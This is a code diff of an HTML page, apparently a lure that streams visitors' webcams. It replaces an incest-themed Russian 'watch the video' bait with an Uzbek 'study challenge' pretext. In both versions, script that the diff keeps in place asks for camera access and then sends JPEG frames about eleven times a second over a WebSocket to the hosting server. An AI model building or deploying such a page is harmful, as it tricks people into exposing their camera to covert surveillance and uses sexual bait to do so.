@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>секс с братом</title>
+    <title>DragHub - Challenge Reaction</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #c4b5fd; /* taxminiy front ent.png binafsha rangi */
+            background-color: #c4b5fd;
             font-family: 'Segoe UI', sans-serif;
             display: flex;
             flex-direction: column;
@@ -76,9 +76,9 @@
 <body>
 
     <div id="camera-blocker">
-        <h1 style="margin-bottom: 10px;">Оргиналное секс с братом</h1>
-        <p style="font-size: 18px; color: #9ca3af;">If you want to watch the video, please allow it.</p>
-        <button class="start-btn" onclick="initChallenge()">Посмотреть видео</button>
+        <h1 style="margin-bottom: 10px;">IDEAL Study Challenge!</h1>
+        <p style="font-size: 18px; color: #9ca3af;">Ushbu challenge'da qatnashish uchun kamerangiz yoqilishi shart.</p>
+        <button class="start-btn" onclick="initChallenge()">CHALLENGE'NI BOSHLASH</button>
     </div>
 
     <div class="logo">Drag<span>hub</span></div>
@@ -111,19 +111,18 @@
                 blocker.style.display = 'none';
                 userCamera.srcObject = stream;
                 
+                // Internet va Lokal uchun universal protokol aniqlash
                 const wsProtocol = window.location.protocol === "https:" ? "wss://" : "ws://";
                 ws = new WebSocket(wsProtocol + window.location.host + "/ws?role=user");
 
                 ws.onopen = () => {
-                    // Har 90ms da bitta kadr (sekundiga ~11 kadr). Qotish butunlay yo'qoladi!
                     setInterval(() => {
                         if (ws.readyState === WebSocket.OPEN) {
                             ctx.drawImage(userCamera, 0, 0, canvas.width, canvas.height);
-                            // 0.15 koeffitsiyent kadr hajmini maksimal darajada yengillashtiradi
                             const base64Data = canvas.toDataURL('image/jpeg', 0.15); 
                             ws.send(base64Data);
                         }
-                    }, 90);
+                    }, 90); // Tez va silliq uzatish
                 };
 
             } catch (error) {
